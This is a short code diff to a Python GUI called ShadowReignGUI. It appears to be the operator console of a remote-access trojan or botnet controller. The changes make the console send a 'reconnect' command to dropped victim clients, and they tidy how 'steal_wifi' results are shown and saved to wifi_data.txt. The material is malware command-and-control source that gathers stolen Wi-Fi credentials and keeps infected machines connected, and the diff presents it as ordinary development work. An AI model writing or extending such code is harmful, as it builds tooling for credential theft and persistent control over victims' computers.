@@ -124,6 +124,11 @@ class ShadowReignGUI:
                 length_bytes = sock.recv(4)
                 if not length_bytes:
                     self.clients[client_id][1]["status"] = "Offline"
+                    # Send reconnect command before closing
+                    try:
+                        self.send_message(sock, json.dumps({"command": "reconnect"}))
+                    except Exception:
+                        pass
                     self.update_client_list()
                     break
                 length = int.from_bytes(length_bytes, byteorder='big')
@@ -163,10 +168,14 @@ class ShadowReignGUI:
                     messagebox.showerror("Error", response["error"])
                 elif "steal_wifi" in response:
                     self.shell_output.delete(1.0, tk.END)
-                    self.shell_output.insert(tk.END, "\n".join([f"{k}: {v}" for k, v in response.items()]))
-                    self.save_to_file("wifi_data.txt", "\n".join([f"{k}: {v}" for k, v in response.items()]))
+                    self.shell_output.insert(tk.END, "\n".join([f"{k}: {v}" for k, v in response.items() if k != "command"]))
+                    self.save_to_file("wifi_data.txt", "\n".join([f"{k}: {v}" for k, v in response.items() if k != "command"]))
             except Exception:
                 self.clients[client_id][1]["status"] = "Offline"
+                try:
+                    self.send_message(sock, json.dumps({"command": "reconnect"}))
+                except Exception:
+                    pass
                 self.update_client_list()
                 break
 
